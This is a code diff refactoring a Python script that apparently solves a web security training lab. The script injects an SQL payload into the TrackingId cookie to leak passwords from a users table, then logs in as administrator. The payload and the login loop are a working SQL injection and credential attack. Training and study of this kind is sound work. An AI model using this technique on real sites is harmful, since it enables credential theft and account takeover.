@@ -1,13 +1,10 @@
 from ...utils import *
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
-
-import requests
 import re
 
 
-def solve_lab(url, proxies):
-    print_info(f'Extracting passwords by visiting "{url}" with the following cookies:')
+def solve_lab(session):
+    print_info(f'Extracting passwords by visiting "/" with the following cookies:')
     print(
         '{"TrackingId": "\' OR (SELECT password FROM users LIMIT 1 OFFSET \033[1;93m?\033[00m)::int=1 --"}'
     )
@@ -18,7 +15,7 @@ def solve_lab(url, proxies):
         cookies = {
             "TrackingId": f"' OR (SELECT password FROM users LIMIT 1 OFFSET {len(passwords)})::int=1 --"
         }
-        resp = requests.get(url, proxies=proxies, verify=False, cookies=cookies)
+        resp = session.get_path("/", cookies=cookies)
 
         soup = BeautifulSoup(resp.text, "html.parser")
         match = soup.find(string=regex)
@@ -36,29 +33,12 @@ def solve_lab(url, proxies):
     else:
         print_success(f"Successfully extracted {len(passwords)} passwords\n")
 
-    url = urljoin(url, "/login")
-    print_info(f'Grabbing CSRF value from "{url}"...')
-
-    s = requests.session()
-    resp = s.get(url, proxies=proxies, verify=False)
-    soup = BeautifulSoup(resp.text, "html.parser")
-    csrf = soup.select_one('input[name="csrf"]').get("value")
-
-    if csrf is None:
-        print_fail("Unable to grab CSRF value.")
-
-    else:
-        print_success(f"CSRF value: {csrf}\n")
+    csrf = session.get_csrf_token("/login")
 
     print_info("Attempting to log in as administrator using extracted passwords...")
     for password in passwords:
         data = {"csrf": csrf, "username": "administrator", "password": password}
-        resp = s.post(
-            url,
-            proxies=proxies,
-            verify=False,
-            data=data,
-        )
+        resp = session.post_path("/login", data=data)
 
         soup = BeautifulSoup(resp.text, "html.parser")
         invalid = soup.find(string="Invalid username or password.")
